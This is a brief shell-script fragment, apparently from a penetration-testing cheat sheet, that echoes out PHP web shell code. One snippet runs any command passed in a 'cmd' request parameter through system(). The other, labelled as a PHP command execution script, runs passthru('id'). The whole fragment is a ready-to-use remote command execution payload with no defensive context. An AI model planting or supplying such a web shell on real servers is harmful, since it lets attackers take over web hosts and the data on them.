echo -e "if(isset(\$_REQUEST['cmd'])){"
echo -e "    echo \"<pre>\";"
echo -e "    \$cmd = (\$_REQUEST['cmd']);"
echo -e "    system(\$cmd);"
echo -e "    echo \"</pre>\";"
echo -e "    die;"
echo -e "}"
echo -e "?>"
echo -e ""
echo -e "${Point} PHP command execution script"
echo -e "<?php passthru('id'); ?>"
